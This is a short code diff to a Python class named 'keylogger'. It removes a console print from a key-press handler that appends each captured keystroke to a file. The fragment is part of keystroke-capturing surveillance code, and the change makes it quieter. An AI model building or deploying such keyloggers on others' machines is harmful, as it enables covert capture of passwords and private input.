@@ -14,7 +14,6 @@ class keylogger():
         self.filename = filename
 
     def on_press(self, key):
-        print(str(key).strip("'"))
         file = open(self.filename, "a")
         strippedkey = str(key).strip("'")
         if(not(strippedkey.isalpha()) and not(strippedkey.isalnum())):
